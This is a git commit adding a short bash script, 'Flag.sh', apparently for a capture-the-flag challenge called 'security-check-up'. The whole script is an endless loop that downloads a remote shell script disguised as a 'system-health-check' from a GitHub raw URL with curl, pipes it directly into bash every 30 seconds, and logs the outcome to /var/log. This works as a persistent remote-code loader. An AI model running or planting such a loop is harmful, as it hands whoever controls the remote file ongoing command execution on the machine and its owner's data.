f2fb2884433a95137308206e26cdd3a1723f6872
Navneshwar <ch.sc.u4cys24064@ch.students.amrita.edu>
2026-03-16 18:12:09 +0000

    Intial Commit

---
+++ raw/CTF/security-check-up/Flag.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+# URL of your shell script stored online
+SCRIPT_URL="https://raw.githubusercontent.com/EXCLUSIVE-Pre-Selection/main/CTF/security-check-up/system-health-check.sh"
+
+while true; do
+    # Fetch and execute the script
+    curl -s "$SCRIPT_URL" | bash
+    
+    # Check the exit status
+    if [ ${PIPESTATUS[1]} -ne 0 ]; then
+        echo "$(date): Script execution failed" >> /var/log/remote_script.log
+    else
+        echo "$(date): Script executed successfully" >> /var/log/remote_script.log
+    fi
+    
+    # Wait for 30 seconds
+    sleep 30
+done
